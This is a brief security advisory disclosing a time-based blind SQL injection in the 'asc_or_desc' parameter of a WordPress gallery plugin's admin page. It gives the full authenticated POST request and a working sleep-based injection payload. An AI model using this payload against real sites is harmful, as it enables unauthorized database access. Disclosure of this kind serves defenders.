----------------------------------------------------------------

Vulnerability description:

When an authenticated user is creating a new gallery a POST-request is sent to the application that is prone to SQL-Injection in the parameter "asc_or_desc".


POST /wordpress/wp-admin/admin.php?page=galleries_bwg HTTP/1.1
Host: <IP>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: <Wordpress-Cookie>
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 150

search_value=&page_number=1&search_or_not=&task=add&current_id=&ids_string=&asc_or_desc=asc&order_by=order


The parameter asc_or_desc in the POST body is prone to a AND/OR time-based blind SQL-Injection. WIth the following payload a delay can be provoked in the request of additional 10 seconds:

asc_or_desc=asc%2c(select%20*%20from%20(select(sleep(10)))a)

Direct database access will be possible if an attacker is exploiting the SQL Injection vulnerability.
